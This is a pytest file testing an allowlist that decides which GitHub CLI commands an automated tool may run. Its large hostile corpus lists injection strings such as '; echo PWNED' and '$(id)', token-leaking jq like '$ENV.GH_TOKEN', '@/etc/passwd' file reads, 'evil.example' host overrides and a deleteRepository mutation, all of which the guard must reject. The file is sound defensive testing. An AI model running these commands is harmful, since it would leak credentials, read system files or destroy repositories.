"""decide(): the allowlist, the hostile corpus, flag-value rules, jq leaks, GraphQL tokens."""
from __future__ import annotations

import pytest
from tribunal_helpers import (
    ALLOW_CORPUS,
    READ_QUERY,
    RESOLVE_MUTATION,
    SHA,
    allow_gh,
    allowed,
    read_cmd,
    resolve_cmd,
)


@pytest.mark.parametrize("cmd", ALLOW_CORPUS)
def test_legitimate_corpus_is_allowed(cmd: str) -> None:
    assert allowed(cmd)


def test_quoting_is_neutral_to_approval() -> None:
    assert allowed("gh pr view 12 --json number")
    assert allowed("gh 'pr' \"view\" '12' --json 'number'")
    assert allowed("gh pr list --head feature/x") == allowed("gh pr list --head 'feature/x'")
    assert allowed(f"gh api repos/o/r/contents/src/app.py'?ref={SHA}'")


HOSTILE = [
    # shell syntax riding along
    "gh pr view 1; echo PWNED",
    "gh pr view 1 && id",
    "gh pr view 1 | sh",
    "gh pr view $(id)",
    "gh pr view `id`",
    "gh pr view 1\nrm -rf x",
    "gh pr view 1 > /tmp/x",
    "gh api repos/o/r/pulls/1/comments --paginate > /tmp/pr_comments.json",
    "gh pr list --head $(git branch --show-current) --json number",
    "gh api repos/o/r/contents/src/app.py?ref=abc",  # unquoted ? is a glob
    # prefix / wrapper tricks
    "FOO=1 gh pr view 1",
    "env gh pr view 1",
    "/usr/bin/gh pr view 1",
    "command gh pr view 1",
    "sudo gh pr view 1",
    "\uff47h pr view 1",
    "ghx pr view 1",
    "gh",
    "",
    # dangerous flags on allowed commands
    "gh auth status --show-token",
    "gh auth status -t",
    "gh auth login",
    "gh auth token",
    "gh repo view --web",
    "gh repo view -w",
    "gh pr view 1 --web",
    "gh pr view 1 --comments",
    "gh pr view 1 -- --web",
    "gh pr checkout 1 --force",
    "gh pr checkout 1 -f",
    "gh pr checkout 1;x",
    "gh pr checkout",
    "gh pr checkout feature/x",
    "gh pr checkout 1 2",
    "gh pr merge 1",
    "gh pr close 1",
    "gh pr create",
    "gh pr comment 1 --body x",
    "gh pr review 1 --approve",
    "gh pr edit 1 --title x",
    "gh repo delete octo/repo",
    "gh issue create",
    "gh extension install x/y",
    "gh alias set x 'pr view'",
    "gh codespace ssh",
    "gh run view 1",
    # REST mutation spellings
    "gh api repos/o/r/issues/1/comments --raw-field body=x",
    "gh api repos/o/r/issues/1/comments -f body=x",
    "gh api repos/o/r/issues/1/comments -fbody=x",
    "gh api repos/o/r/issues/1/comments -F body=@/etc/passwd",
    "gh api repos/o/r/issues/1/comments --field body=x",
    "gh api repos/o/r/issues/1/comments -X POST",
    "gh api repos/o/r/issues/1/comments -XPOST",
    "gh api repos/o/r/issues/1/comments -X=POST",
    "gh api repos/o/r/issues/1/comments --method POST",
    "gh api repos/o/r/issues/1/comments --method=POST",
    "gh api repos/o/r/issues/1/comments -d x",
    "gh api repos/o/r/issues/1/comments --data x",
    "gh api repos/o/r/issues/1/comments --input f",
    "gh api repos/o/r/issues/1/comments --input=f",
    "gh api repos/o/r/issues/1/comments -H 'X-HTTP-Method-Override: DELETE'",
    "gh api repos/o/r/issues/1/comments --header x:y",
    "gh api repos/o/r/issues/1/comments --hostname evil.example",
    "gh api repos/o/r/issues/1/comments -i",
    "gh api repos/o/r/issues/1/comments --include",
    "gh api repos/o/r/issues/1/comments --template x",
    "gh api repos/o/r/issues/1/comments -t x",
    "gh api repos/o/r/issues/1/comments --paginate=false",
    "gh api repos/o/r/issues/1/comments --paginate=true",
    "gh api repos/o/r/issues/1/comments --",
    "gh api repos/o/r/issues/1/comments --unknown",
    "gh api --paginate repos/o/r/issues/1/comments",
    "gh api repos/o/r/issues/1/comments repos/o/r/issues/2/comments",
    # endpoint shape
    "gh api repos/o/r/contents/../../../user",
    "gh api repos/../r/pulls/1",
    "gh api repos/o/../pulls/1",
    "gh api repos/o/r/pulls/..",
    "gh api repos/o/r/pulls/",
    "gh api repos/o/r/pulls",
    "gh api repos/o/r/actions/runs/1",
    "gh api repos/o/r/git/refs",
    "gh api repos/o/r/pulls//1",
    "gh api user",
    "gh api /user",
    "gh api graphql",
    "gh api -X GET repos/o/r/pulls/1",
    "gh api 'repos/o/r/contents/x?ref=a&evil=1'",
    "gh api 'repos/o/r/contents/x?ref='",
    "gh api 'repos/o/r/contents/x?'",
    "gh api 'repos/o/r/contents/x?ref=a/../b'",
    "gh api 'repos/o/r/contents/x{y}'",
    "gh api 'repos/o/r/contents/x%2e%2e/y'",
    "gh api https://evil.example/repos/o/r/pulls/1",
    # flag value rules
    "gh pr view 1 --json -q",
    "gh pr view 1 --jq -x",
    "gh pr view 1 -q --web",
    "gh pr view 1 --json=-x",
    "gh pr view 1 --repo --web",
    "gh pr view 1 -R o",
    "gh pr view 1 -R o/r/x",
    "gh pr view 1 -R ../x",
    "gh pr view 1 -R=o/r",
    "gh pr view 1 -qfoo",
    "gh pr view 1 -q=.number",
    "gh pr view 1 --json number --json state",
    "gh pr view 1 --json ''",
    "gh pr view 1 --json 'a b'",
    "gh pr view 1 2",
    "gh pr view -1",
    "gh pr view ..",
    "gh pr list --state bogus",
    "gh pr list --state=-x",
    "gh pr list --limit x",
    "gh pr list --limit -1",
    "gh pr list --head -x",
    "gh pr list --head ../x",
    "gh pr list 12",
    "gh pr list --json",
    "gh pr list --head",
    "gh api repos/o/r/pulls/1 --cache x",
    "gh api repos/o/r/pulls/1 --cache 1d",
    "gh api repos/o/r/pulls/1 --cache -1",
    "gh api repos/o/r/pulls/1 --jq",
    "gh api repos/o/r/pulls/1 --jq ''",
    "gh api repos/o/r/pulls/1 --jq .a --jq .b",
    "gh repo view a/b/c",
    "gh repo view -- x",
    "gh repo view x y",
    # jq leaks of the environment
    "gh pr view 1 --jq '$ENV.GH_TOKEN'",
    "gh pr view 1 --jq '$ENV'",
    "gh pr view 1 -q '$ENV|tojson'",
    "gh pr view 1 --jq 'env.GH_TOKEN'",
    "gh pr view 1 --jq 'env'",
    "gh pr view 1 --jq '. | env | keys'",
    "gh pr view 1 --jq '\"\\(env)\"'",
    "gh pr view 1 --jq '(env)'",
    "gh pr view 1 --jq 'input_filename'",
    "gh pr view 1 --jq '$__loc__'",
    "gh api repos/o/r/pulls/1 --jq '$ENV.GH_TOKEN'",
    "gh repo view --jq '$ENV.PATH'",
    "gh pr list --jq 'env.HOME'",
    # graphql
    read_cmd(query=READ_QUERY + " mutation { x }"),
    read_cmd(query=READ_QUERY + "\nmutation { resolveReviewThread(input: {threadId: \"PRRT_kwDOAbc123\"}) { thread { isResolved } } }"),
    read_cmd(query=READ_QUERY.replace("isResolved", "isResolved viewerHasStarred")),
    read_cmd(query=READ_QUERY.replace("isResolved", "alias: isResolved")),
    read_cmd(query=READ_QUERY.replace("body", "body # comment")),
    read_cmd(query=READ_QUERY.replace("path", "path @include(if: true)")),
    read_cmd(query=READ_QUERY.replace("first: 100", "first: 1000")),
    read_cmd(query=READ_QUERY.replace("viewerCanResolve", "")),
    read_cmd(query=READ_QUERY.replace("(first: 1)", "(first: 1, last: 1)")),
    read_cmd(query=READ_QUERY.replace("author { login }", "author { login } ...on User { email }")),
    read_cmd(query="query { viewer { login } }"),
    read_cmd(query=""),
    read_cmd(owner="o r"),
    read_cmd(owner=".."),
    read_cmd(repo=".."),
    read_cmd(number="12abc"),
    read_cmd(number="-1"),
    read_cmd(number="@/etc/passwd"),
    read_cmd(owner_flag="-F"),  # -F owner=... is a typed/file-reading field
    read_cmd(number_flag="-f"),  # number must be typed
    read_cmd() + " -f extra=1",
    read_cmd() + " -F extra=1",
    read_cmd() + " -f owner=other",
    read_cmd() + " --jq .data",
    read_cmd() + " -X POST",
    read_cmd() + " --method POST",
    read_cmd() + " --input f",
    read_cmd() + " --hostname evil.example",
    read_cmd() + " -F query=@/etc/passwd",
    "gh api graphql -F query=@/etc/passwd",
    "gh api graphql -F query=@/etc/passwd -f owner=o -f repo=r -F number=1",
    f"gh api graphql -f owner=o -f repo=r -F number=1 -F query=@{'/etc/passwd'}",
    "gh api graphql -f owner=o -f repo=r -F number=1",
    "gh api graphql -f owner=o -f repo=r -f query=x",
    "gh api graphql -f query=",
    "gh api graphql -f query",
    "gh api graphql query",
    "gh api graphql --paginate",
    "gh api graphql -f 'query=mutation { deleteRepository(input: {repositoryId: \"abcdefgh12\"}) { clientMutationId } }'",
    resolve_cmd(RESOLVE_MUTATION + " mutation { deleteRepository(input: {repositoryId: \"abcdefgh12\"}) { clientMutationId } }"),
    resolve_cmd(RESOLVE_MUTATION.replace("mutation {", "mutation { a: resolveReviewThread(input: {threadId: \"PRRT_kwDOAbc123\"}) { thread { isResolved } }")),
    resolve_cmd(RESOLVE_MUTATION.replace("{ thread { isResolved } }", "{ thread { isResolved id } }")),
    resolve_cmd(RESOLVE_MUTATION.replace("{ thread { isResolved } }", "{ clientMutationId }")),
    resolve_cmd(RESOLVE_MUTATION.replace("resolveReviewThread", "unresolveReviewThread")),
    resolve_cmd(RESOLVE_MUTATION.replace("PRRT_kwDOAbc123", "short")),
    resolve_cmd(RESOLVE_MUTATION.replace("PRRT_kwDOAbc123", "A" * 129)),
    resolve_cmd(RESOLVE_MUTATION.replace("PRRT_kwDOAbc123", "PRRT kwDOAbc123")),
    resolve_cmd(RESOLVE_MUTATION.replace("PRRT_kwDOAbc123", "PRRT_kwDO\\\"Abc123")),
    resolve_cmd(RESOLVE_MUTATION.replace('"PRRT_kwDOAbc123"', "$id")),
    resolve_cmd(RESOLVE_MUTATION.replace('"PRRT_kwDOAbc123"', '"PRRT_kwDOAbc123" "PRRT_kwDOAbc124"')),
    resolve_cmd(RESOLVE_MUTATION.replace("mutation", "query")),
    resolve_cmd(RESOLVE_MUTATION.replace("mutation {", "mutation Named {")),
    resolve_cmd(RESOLVE_MUTATION.replace("mutation {", "mutation @x {")),
    resolve_cmd(RESOLVE_MUTATION + " # trailing"),
    resolve_cmd(RESOLVE_MUTATION.replace("input:", "input: [")),
    resolve_cmd() + " --paginate",
    resolve_cmd() + " -f owner=o",
    resolve_cmd() + " -F number=1",
    resolve_cmd() + " -f query=" + "'" + RESOLVE_MUTATION + "'",
    resolve_cmd(flag="-F"),
    resolve_cmd(flag="--field"),
]


@pytest.mark.parametrize("cmd", HOSTILE)
def test_hostile_corpus_is_declined(cmd: str) -> None:
    assert not allowed(cmd)


def test_hostile_corpus_has_no_overlap_with_allow_corpus() -> None:
    assert not set(HOSTILE) & set(ALLOW_CORPUS)


# ---- flag-value rules (verdict change 3) --------------------------------------------


@pytest.mark.parametrize(
    "cmd",
    [
        "gh pr view 1 --json number,state",
        "gh pr view 1 --json=number",
        "gh pr list --state merged --limit 5",
        "gh pr list --state=all",
        "gh api repos/o/r/pulls/1 --cache 30s",
        "gh api repos/o/r/pulls/1 --cache=2h",
        "gh api repos/o/r/pulls/1 --cache 15",
        "gh pr view 1 -R octo/re.po-x_y",
        "gh repo view octo/repo",
    ],
)
def test_flag_value_charsets_accepted(cmd: str) -> None:
    assert allowed(cmd)


def test_unknown_flag_cannot_hide_as_a_value() -> None:
    assert not allowed("gh pr view 1 --json --web")
    assert not allowed("gh pr list --head --web")
    assert not allowed("gh pr view 1 --repo -x")
    assert not allowed("gh api repos/o/r/pulls/1 --jq --paginate")


def test_boolean_flag_takes_no_value() -> None:
    assert allowed("gh api repos/o/r/pulls/1 --paginate")
    assert not allowed("gh api repos/o/r/pulls/1 --paginate=false")
    assert not allowed("gh api repos/o/r/pulls/1 --paginate=")
    assert not allowed("gh api repos/o/r/pulls/1 --paginate --paginate")


def test_double_dash_is_denied() -> None:
    assert not allowed("gh pr view 1 --")
    assert not allowed("gh pr view -- 1")
    assert not allowed("gh api -- repos/o/r/pulls/1")


def test_short_flags_only_as_separate_tokens() -> None:
    assert allowed("gh pr view 1 -q .number")
    assert not allowed("gh pr view 1 -q.number")
    assert not allowed("gh pr view 1 -q=.number")
    assert not allowed("gh pr view 1 -R=o/r")
    assert not allowed("gh pr view 1 -Ro/r")


def test_rest_denies_every_field_spelling() -> None:
    for flag in ("-f", "-F", "--field", "--raw-field", "--field=a=b", "--raw-field=a=b", "-fa=b", "-Fa=b"):
        assert not allowed(f"gh api repos/o/r/pulls/1/comments {flag} a=b"), flag
        assert not allowed(f"gh api repos/o/r/pulls/1/comments {flag}"), flag


def test_graphql_long_spellings_are_aliases() -> None:
    assert allowed(read_cmd(owner_flag="--raw-field", number_flag="--field"))
    assert allowed(resolve_cmd(flag="--raw-field"))
    # `-f` is `--raw-field` and `-F` is `--field`: a typed (-F/--field) query is a file-read vector.
    assert not allowed(resolve_cmd(flag="--field"))
    assert not allowed(read_cmd(owner_flag="--field"))


def test_equals_form_for_long_flags() -> None:
    assert allowed("gh api graphql --raw-field=query='" + RESOLVE_MUTATION + "'")
    assert allowed("gh pr list --head=feature/x --state=open")


# ---- jq (verdict change 4) ----------------------------------------------------------


@pytest.mark.parametrize(
    "expr",
    [
        ".number",
        ".[] | {id, user: .user.login, body}",
        ".check_runs[]",
        "length",
        '.state + " " + .title',
        ".env",
        ".user.env",
        ".environment",
        ".statuses[] | {context, state}",
        ".nameWithOwner",
    ],
)
def test_ordinary_jq_is_allowed(expr: str) -> None:
    assert allowed(f"gh pr view 1 --json number --jq '{expr}'")


@pytest.mark.parametrize(
    "expr",
    ["$ENV", "$ENV.X", "env", "env.X", "[env]", "{a: env}", "(env)", "\\(env)", "input_filename", "$__loc__", " env ", "$ ENV", "$ ENV.X", 'import \"a\" as $x; .', 'include \"a\"; .'],
)
def test_jq_environment_reads_are_denied(expr: str) -> None:
    assert not allowed(f"gh pr view 1 --json number --jq '{expr}'")
    assert not allowed(f"gh api repos/o/r/pulls/1 -q '{expr}'")


# ---- GraphQL token-level matching (verdict change 2) --------------------------------


def _reformat(doc: str) -> list[str]:
    return [
        " ".join(doc.split()),
        doc.replace(": ", ":").replace(" {", "{"),
        doc.replace("{", " {\n").replace(",", " , "),
        doc.replace("\n", "\n\n").replace("  ", "\t"),
        doc.replace(", ", ",").replace("(", " ( ").replace(")", " ) "),
        doc.replace(": ", " : "),
        doc.replace("{ ", "{").replace(" }", "}"),
        doc.replace(", ", "\n"),
    ]


@pytest.mark.parametrize("variant", range(8))
def test_read_query_survives_harmless_reformatting(variant: int) -> None:
    assert allowed(read_cmd(query=_reformat(READ_QUERY)[variant]))


@pytest.mark.parametrize("variant", range(8))
def test_resolve_mutation_survives_harmless_reformatting(variant: int) -> None:
    assert allowed(resolve_cmd(_reformat(RESOLVE_MUTATION)[variant]))


def test_resolve_accepts_legacy_base64_node_ids() -> None:
    for node in ("PRRT_kwDOAbc123", "MDEyOlB1bGxSZXF1ZXN0UmV2aWV3VGhyZWFkMQ==", "abc+def/ghi=", "A" * 128):
        assert allowed(resolve_cmd(RESOLVE_MUTATION.replace("PRRT_kwDOAbc123", node))), node


def test_lexer_alphabet() -> None:
    lex = allow_gh.lex_graphql
    assert lex("a(b: $c, d: 1) { e }") == ["a", "(", "b", ":", "$c", "d", ":", "1", ")", "{", "e", "}"]
    for bad in ("#c", "...x", "@x", "[a]", "a|b", "a&b", "a=b", "'x'", '"x"', "a.b", "a-b", "é", "a\x00"):
        assert lex(bad) is None, bad
    assert lex('"abcdefgh"', allow_string=True) == ['"@"']
    assert lex('"abcdefg"', allow_string=True) is None  # too short
    assert lex('"abcdefgh"') is None  # strings only where allowed


def test_read_refuses_without_the_canonical_file() -> None:
    argv = allow_gh.tokenize(read_cmd())
    assert argv is not None
    assert allow_gh.decide(argv)
    assert not allow_gh.decide(argv, threads_tokens=None)
    # the resolve mutation does not depend on the file
    argv2 = allow_gh.tokenize(resolve_cmd())
    assert argv2 is not None
    assert allow_gh.decide(argv2, threads_tokens=None)


def test_canonical_file_lexes_cleanly() -> None:
    toks = allow_gh.load_threads_tokens()
    assert toks and toks[0] == "query" and "reviewThreads" in toks
    assert "mutation" not in toks
